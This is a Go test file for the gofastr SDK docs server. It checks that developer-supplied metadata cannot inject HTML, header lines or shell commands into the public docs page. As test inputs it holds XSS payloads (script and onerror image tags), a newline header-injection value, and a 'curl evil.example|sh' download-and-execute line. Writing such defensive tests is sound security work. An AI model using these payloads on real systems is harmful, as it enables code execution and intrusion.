package sdkdocs

import (
	"encoding/json"
	"strings"
	"testing"
	"testing/fstest"
	"time"

	"github.com/DonaldMurillo/gofastr/core/schema"
	"github.com/DonaldMurillo/gofastr/framework/entity"
	"github.com/DonaldMurillo/gofastr/framework/sdk"
)

// Property: entity metadata is data, not markup. Field names, enum values,
// and endpoint descriptions are developer/blueprint-authored strings that
// land in a publicly served HTML page; every one of them must arrive
// escaped so a crafted declaration cannot inject elements into the SDK
// docs site. Surfaces asserted: the fields table (name column, enum
// notes) and the endpoints table (description column).
func TestEntityMetadataEscapedOnDocsPage(t *testing.T) {
	reg := &fakeRegistry{entities: []*entity.Entity{
		entity.Define("esc", entity.EntityConfig{
			Table:    "esc",
			Exposure: &entity.ExposureConfig{Public: true},
			Fields: []schema.Field{
				{Name: "<script>alert(1)</script>", Type: schema.String, Required: true},
				{Name: "status", Type: schema.Enum, Values: []string{"ok", "<img src=x onerror=alert(2)>"}},
			},
			Endpoints: []entity.Endpoint{
				{Method: "GET", Path: "probe", Description: "<img src=x onerror=alert(3)>"},
			},
		}),
	}}
	srv := mountedServer(t, Config{Registry: reg})
	resp, body := get(t, srv, "/docs/api/entities/esc")
	if resp.StatusCode != 200 {
		t.Fatalf("entity page status = %d", resp.StatusCode)
	}
	for _, raw := range []string{"<script>alert(1)", "<img src=x onerror"} {
		if strings.Contains(body, raw) {
			t.Errorf("docs page embedded raw markup from entity metadata: %q reached the HTML unescaped", raw)
		}
	}
	// The metadata itself must still be documented (escaped), the guard
	// cannot become a silent drop.
	if !strings.Contains(body, "alert(1)") || !strings.Contains(body, "alert(3)") {
		t.Errorf("entity metadata vanished from the docs page instead of being escaped")
	}
}

// Property: manifest-derived values never reach response headers with
// control characters or quote breakouts. The manifest is a file in the
// dist directory; its SDKVersion is concatenated into the download's
// Content-Disposition filename.
func TestManifestJunkSanitizedInHeaders(t *testing.T) {
	reg := testRegistry()
	m := sdk.Manifest{
		SchemaVersion:  sdk.SchemaVersion,
		App:            "testapp",
		SDKVersion:     "1.0.0\nX-Injected: yes",
		GofastrVersion: "v0.33.0",
		GeneratedAt:    time.Date(2026, 7, 18, 0, 0, 0, 0, time.UTC),
		Entities:       []string{"posts"},
		SchemaHash:     "sha256:deadbeef",
		Artifacts: map[string]sdk.Artifact{
			"go": {File: sdk.GoArtifact, SHA256: "aa11", Bytes: 3, Module: "local/testapp-sdk"},
		},
	}
	raw, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	dist := fstest.MapFS{
		sdk.ManifestFile: {Data: raw},
		sdk.GoArtifact:   {Data: []byte("zip")},
	}
	srv := mountedServer(t, Config{Registry: reg, Artifacts: dist})
	resp, _ := get(t, srv, "/docs/api/sdk/go.zip")
	if resp.StatusCode != 200 {
		t.Fatalf("go.zip status = %d", resp.StatusCode)
	}
	cd := resp.Header.Get("Content-Disposition")
	if strings.ContainsAny(cd, "\n\r") {
		t.Errorf("Content-Disposition carries a control character from the manifest's SDKVersion: %q", cd)
	}
	if strings.Count(cd, `"`) != 2 {
		t.Errorf("Content-Disposition filename quoting is broken: %q", cd)
	}
}

// Property: the drift check compares like with like. A manifest that
// covers only "posts" must not flip to "out of date" merely because the
// live registry grew an entity the SDK never claimed to cover (the
// Entities list is the manifest's own scope declaration, --only/--exclude
// exist for exactly that).
func TestDriftScopedToManifestEntities(t *testing.T) {
	reg := testRegistry() // posts + gated invoices
	reg.entities = append(reg.entities, entity.Define("secrets", entity.EntityConfig{
		Table:    "secrets",
		Exposure: &entity.ExposureConfig{Public: true},
		Fields:   []schema.Field{{Name: "payload", Type: schema.String}},
	}))
	srv := mountedServer(t, Config{Registry: reg, Artifacts: testArtifacts(t, reg, true)})
	_, body := get(t, srv, "/docs/api/")
	if strings.Contains(body, "out of date") {
		t.Errorf("drift banner fired for a live entity outside the manifest's declared scope")
	}
}

// Pins [sdkdocs-install-fence], found by the 2026-09-04 red-probe
// round; fixed in screens.go goModuleHint/goDirHint passing manifest
// values through fenceWord before they reach the install snippet.
// Property: manifest-derived strings never break out of the install
// snippet's line structure — a value that carries a newline lands as its
// own line inside the ```sh block the docs page renders with a copy
// button, so a manifest App name with embedded commands becomes
// operator-copyable shell.
// Surfaces: framework/sdkdocs/screens.go::goDirHint (fenceWord(m.App)),
// ::goModuleHint (fenceWord(artifact Module)), versus sdkdocs.go::
// sanitizeFilename (the header-side guard TestManifestJunkSanitizedInHeaders
// proves for Content-Disposition).
func TestInstallFenceScrubManifestApp(t *testing.T) {
	const payload = "curl evil.example|sh"
	reg := testRegistry()
	m := sdk.Manifest{
		SchemaVersion:  sdk.SchemaVersion,
		App:            "acme\n" + payload,
		SDKVersion:     "1.0.0",
		GofastrVersion: "v0.33.0",
		GeneratedAt:    time.Date(2026, 9, 4, 0, 0, 0, 0, time.UTC),
		Entities:       []string{"posts"},
		SchemaHash:     "sha256:deadbeef",
		Artifacts: map[string]sdk.Artifact{
			"go": {File: sdk.GoArtifact, SHA256: "aa11", Bytes: 3, Module: "local/acme-sdk"},
		},
	}
	raw, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	dist := fstest.MapFS{
		sdk.ManifestFile: {Data: raw},
		sdk.GoArtifact:   {Data: []byte("zip")},
	}
	srv := mountedServer(t, Config{Registry: reg, Artifacts: dist})
	resp, body := get(t, srv, "/docs/api")
	if resp.StatusCode != 200 {
		t.Fatalf("docs index status = %d", resp.StatusCode)
	}
	// False-positive guard: the app name must still be documented.
	if !strings.Contains(body, "acme") {
		t.Fatalf("manifest app name vanished entirely — a fix must scrub, not drop:\n%s", body)
	}
	if strings.Contains(body, payload) {
		t.Fatalf("SECURITY: [sdkdocs-install-fence] manifest App name with embedded newline renders %q as its own line inside the copyable ```sh install block on /docs/api/ (goDirHint returns m.App raw and installTabs interpolates it at line position) — the same manifest junk the header-side pin scrubs via sanitizeFilename has no body-side guard", payload)
	}
}
